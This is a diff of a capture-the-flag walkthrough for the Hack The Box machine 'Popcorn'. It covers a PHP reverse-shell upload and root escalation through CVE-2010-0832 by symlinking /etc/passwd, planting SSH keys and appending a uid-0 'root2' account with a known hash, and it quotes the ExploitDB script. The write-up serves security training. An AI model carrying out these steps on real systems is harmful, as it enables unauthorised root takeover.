@@ -13,7 +13,7 @@ The hack the box machine "Popcorn" is a medium machine which is included in [TJn
 
 By enumerating the target, it is possible to discover that port 80 is open. Then, by bruteforcing directories on port 80, one can find `/rename` and `/torrent` which contain a file renaming API and a torrent hosting web site respectively. By navigating to http://10.10.10.6/torrent it is possible to find a login form which allows for sign ups. Once signed up, it is possible to upload torrents to the web server. The first way to achieve remote code execution is to upload a legitimate torrent, navigate to its description, change the image of the torrent to a fake image which contains a reverse shell payload in php, change the extension fo the image from `.png` to `.php` and navigate to the php file to trigger the execution of the script. 
 
-The second approach is to bypass the filter for torrent uploads by uploading a fake torrent which contain a reverse shell payload in php. The fake torrents extension can then be changed with the `rename` api and it is then possible to achieve remote code execution as performed for the first approach. Once an initial shell as `www-data` data has been obtained, the privilege escalation can be performed either through CVE-x or with dirty cow. The next two sections show how to obtain remote code execution using the two approaches. Then, the two subsequent sections show the two ways to perform a privilege escalation from `www-data` to `root`.
+The second approach is to bypass the filter for torrent uploads by uploading a fake torrent which contain a reverse shell payload in php. The fake torrents extension can then be changed with the `rename` api and it is then possible to achieve remote code execution as performed for the first approach. Once an initial shell as `www-data` data has been obtained, the privilege escalation can be performed either through [CVE-2010-0832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0832) or with Dirty Cow. The next two sections show how to obtain remote code execution using the two approaches. Then, the two subsequent sections show the two ways to perform a privilege escalation from `www-data` to `root`.
 
 # Exploitation
 We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.85`. The `-sS` `-sC` and `-sV` flags instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that port 22 and 80 are open. These ports correspond to SSH and HTTP respectively. 
@@ -213,11 +213,9 @@ Upon visiting the URL, we get the message "OK!", suggesting that the renaming op
 The next step is to perform a privilege escalation from `www-data` to `root`. There are two ways to do this. The first way is to abuse a known vulnerability in Linux PAM and the second is through kernel exploitation, as we'll see in the next two sections.
 
 # Privilege Escalation - Linux PAM
-Linux [Pluggable Authentication Modules](https://en.wikipedia.org/wiki/Linux_PAM) (PAM) is a set of libraries that can be used to configure authenticate users a centralized manner. It makes it possible to separate authentication from source code. Instead, authentication can be configured through config files. PAM can for example be used to authenticate users, check if a user account is valid or enforce the usage of strong passwords.checking the directories on the target host, we can discover the directory .cache in the `george` users home directory. This directory is typically created and used by PAM. 
+Linux [Pluggable Authentication Modules](https://en.wikipedia.org/wiki/Linux_PAM) (PAM) is a set of libraries that can be used to configure authentication of users in a centralized manner. It makes it possible to separate authentication mechanisms from source code by allowing the configuration of these mechanisms through config files. PAM can for example be used to check if a user account is valid, authenticate a user or enforce the usage of strong passwords. 
 
-dpkg -l | grep pam
-
-If we check the PAM version, as performed above, we can see that the host uses PAM version 1.0.0 which is vulnerable to CVE-2010-0832 which has an exploit on [exploitdb](https://www.exploit-db.com/exploits/14273). The content of this exploit is shown below. By reading the exploit, we can see that the only relevant part is line x `ln -sf $1 $HOME/.cache` where the exploit creates a symbolic link from the `.cache` directory to a file we want to change permissions for. We could use the exploit as is or just use this command.
+We can search for PAM among the list of installed packages by executing the command `dpkg -l | grep pam`. The output of the command, displayed below, state that version `1.1.0-2ubuntu1` of `libpam-modules` is being used. By executing `lsb_release -a` it is possible to see that OS of the target is `Ubuntu 9.10`. Using this particular version of `libpam-modules` on `Ubuntu 9.10` makes the host vulnerable to [CVE-2010-0832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0832) which has an exploit available on [ExploitDB](https://www.exploit-db.com/exploits/14273). The content of this exploit is shown below. By reading the exploit, we can see that the only relevant part is line 11 `ln -sf $1 $HOME/.cache` where the exploit creates a symbolic link from the `.cache` directory in a users home directory, to a file we want to change permissions for. From the code, and from [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0832), it is evident that the file which we create a symbolic link to will be owned by our user the next time we log in. 
 
 {% highlight bash linenos %}
 if [ $# -eq 0 ]; then
@@ -234,32 +232,33 @@ ln -sf $1 $HOME/.cache
 echo "\n@@@ Now log back into your shell (or re-ssh) to make PAM call vulnerable MOTD code :)  File will then be owned by your user.  Try /etc/passwd...\n"
 {% endhighlight %}
 
+Next, we proceed to delete the existing directory `/var/www/.cache` by executing `rm -r /var/www/.cache`, as demonstrated in the image below. Then, we execute `ln -sf /etc/passwd /var/www/.cache` to create a symbolic link to the `/etc/passwd` file.
+
+ls -l /var/www/.cache
 rm -r /var/www/.cache
 ln -sf /etc/passwd /var/www/.cache
 ls -l /var/www/.cache
+
+To exploit the vulnerability, we now need to somehow log in as the `www-data` user. Earlier we saw that SSH is running on port 22. If we set up SSH for the `www-data` user, we can log in as this user and exploit the vulnerability to take ownership of the `/etc/passwd` file. To setup SSH for the `www-data` user, we start by executing `ssh-keygen` to generate a SSH key pair. Then, we execute `cp /var/www/.ssh/id_rsa.pub /var/www/.ssh/authorized_keys` to ensure that the private key `id_rsa` can be used to login to the host over SSH. Next, we base64 encode the private key `id_rsa` by executing `cat /var/www/.ssh/id_rsa | base64 -w0`. We copy the output of the command and place it at it `[x]` in the command `echo '[x]' | base64 -d > id_rsa`. Then, we change the permissions of the private key by executing `chmod 600 ./id_rsa` and log in as the `www-data` user by executing `ssh -i ./id_rsa www-data@10.10.10.6`.
 
 ssh-keygen
 cp /var/www/.ssh/id_rsa.pub /var/www/.ssh/authorized_keys
 cat /var/www/.ssh/id_rsa | base64 -w0
 echo '[base64]' | base64 -d > id_rsa
-chmod 600 id_rsa
-ssh -i id_rsa www-data@10.10.10.6
+chmod 600 ./id_rsa
+ssh -i ./id_rsa www-data@10.10.10.6
 
-PAM is initialized when someone logs in with their account. As such, we need to somehow log in as the www-data user to exploit the vulnerabilty. Earlier we saw that SSH is running on port 22. If we set up SSH for the www-data user, we can log in as this user and exploit the vulnerability. To setup SSH for this user, we start by creating the directory `/var/www/.ssh` by executing `mkdir /var/www/.ssh`. Then, we execute `ssh-keygen` to generate an SSH key pair. Then, we change the permissions of the private key by executing chmod 600 /home. Note that we can find the home directory `/var/www` of the `www-data` user by executing `echo $HOME`. 
-
-We set up ssh for www-data
+<!-- $1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/ -->
+As can be seen in the image below, this changes the ownership of the `/etc/passwd` file. We proceed to generate a password hash for the password hash by executing `openssl passwd -1 hacked`. Then, we use this password hash to create a second `root` user by exeuting `echo 'root2:$1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/:0:0:pwned:/root:/bin/bash' >> /etc/passwd`. We can use the `su` command to switch to this new user. We do, however, first need to upgrade our shell. This can be done with python by executing `python -c "import pty; pty.spawn('/bin/bash')"`. Once we have upgraded our shell, we execute `su root2` and provide the password "hacked". This provides us with `root` privileges on the target!
 
 openssl passwd -1 hacked
-
-1  Use the MD5 based BSD password algorithm 1.
-
-$1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/
-
 echo 'root2:$1$CauwiL81$RVCASCR/bjV7Ls3c8fBpP/:0:0:pwned:/root:/bin/bash' >> /etc/passwd
-
 python -c "import pty; pty.spawn('/bin/bash')"
-
 su root2
+id
+
+[createRoot2]
+
 
 # Privilege Escalation - Kernel Exploitation
 By executing the command `uname -r`, it is possible to obtain the Kernel version on Linux-based systems. In this particular case, executing the command results in the output `2.6.31-14-generic-pae`. If we search for kernel exploits for this kernel version using searchsploit, we can find the well-known "Dirty Cow" exploit. 
